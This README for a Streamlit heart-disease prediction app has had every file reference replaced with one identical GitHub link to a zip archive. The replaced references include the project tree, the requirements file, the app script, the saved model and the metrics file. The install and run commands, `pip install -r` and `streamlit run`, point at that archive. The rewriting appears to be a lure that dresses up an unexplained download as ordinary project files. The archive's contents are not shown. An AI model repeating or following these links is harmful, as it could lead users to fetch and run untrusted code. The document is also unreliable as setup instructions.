# Heart Disease Prediction App

This project is a Machine Learning web application built with **Streamlit**.
It predicts the likelihood of heart disease based on user health data.

## Features

* Interactive **Streamlit UI** for user input
* Real-time **prediction** using a trained ML pipeline
* Data visualization of heart disease trends
* Deployable locally and accessible via **Ngrok** or **Streamlit Cloud**

---

## Project Structure

```
Heart_Disease_Project/
│
├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip           # Main ML pipeline and app logic
├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip          # Saved trained Random Forest model
├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip            # Python dependencies
├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip                   # This README file
├── results/                    # Folder for evaluation metrics
│   └── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip
├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip             # Instructions to set up Ngrok for deployment
```

---

## Installation

1. **Clone the repository**

```bash
git clone <your-repo-url>
cd Heart_Disease_Project
```

2. **Create a virtual environment (optional but recommended)**

```bash
python -m venv venv
source venv/bin/activate      # On Linux/macOS
venv\Scripts\activate         # On Windows
```

3. **Install dependencies**

```bash
pip install -r https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip
```

---

## 🏃 How to Run

1. **Run the Streamlit app**

```bash
streamlit run https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip
```

2. **Optional: Deploy with Ngrok**

* Follow instructions in `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip`
* Run the command provided to get a public URL for your app

---

## Model & Pipeline

* **Dataset:** UCI Heart Disease dataset
* **Preprocessing:** Scaling, one-hot encoding for categorical features
* **Feature Selection:** RFE and Chi-Square test
* **Models:** Logistic Regression, Decision Tree, Random Forest, SVM
* **Final Model:** Random Forest trained on selected features, saved as `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip`

---

## Evaluation Metrics

* Metrics for all models are saved in `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip`
* Includes: Accuracy, Precision, Recall, F1 Score, AUC (if applicable)

---

## Notes

* Ensure Python has **write permissions** for the `results/` folder to save metrics.
* If logistic regression gives a convergence warning, increase `max_iter` or scale features properly.

---
